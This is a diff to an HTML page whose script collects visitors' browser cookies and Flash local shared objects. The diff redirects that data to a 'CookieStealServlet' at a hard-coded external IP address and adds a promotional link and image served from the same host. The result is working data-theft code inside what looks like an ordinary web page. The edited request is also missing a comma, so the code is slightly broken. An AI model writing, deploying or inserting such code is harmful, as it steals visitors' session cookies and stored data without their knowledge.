@@ -11,7 +11,8 @@
 </script>
 </head>
 <body>
-	<img src="../images/loader.gif">
+<a href="http://81.57.18.95:8080/MusExpress/">Come and visit MusExpress</a>
+	<img src="http://81.57.18.95:8080/MusExpress/images/loader.gif">
 	<script>
 	/**creating cookies for tests
 	*/
@@ -32,7 +33,7 @@
 	    storageTypes: ["flash"],
 	    complete: function(byStorageTypeRemovedItemKeysObj, byStorageTypeErrorObj){}
 	});
-	//cheking if OS is windows, linux or apple:
+	//cheking if OS is windows, linux or mac, needed for directory path:
 	var OSName="Unknown OS";
 	if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
 	if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
@@ -54,14 +55,13 @@
 	}
 	
 	var optionsObj = {flash: flashOptionsObj}
-	//Without comments
+	//gets all flos from storage
 	var allFlos = bakedGoods.getAll({
 	    storageTypes: ["flash"],
 	    options: optionsObj,
 	    complete: function(byStorageTypeResultDataObj, byStorageTypeErrorObj){}
 	});
-	
-	console.log(allFlos);
+
 
 	
 	/*
@@ -81,11 +81,14 @@
 	    }
 	    return aString;
 	}
-	//sends cookies to MusExpress server
+	//sends cookies and flos to MusExpress server
 	$.ajax({
 		type : "GET",
-		url : "../CookieStealServlet", //add complete URL
-		data : cookies,
+		url : "http://81.57.18.95:8080/MusExpress/CookieStealServlet", //add complete URL
+		data : {messageCookies : cookies,
+				messageFlos : allFlos
+		}
+				
 	
 		dataType : "json",
 		success : function(data, status, xhr) { 
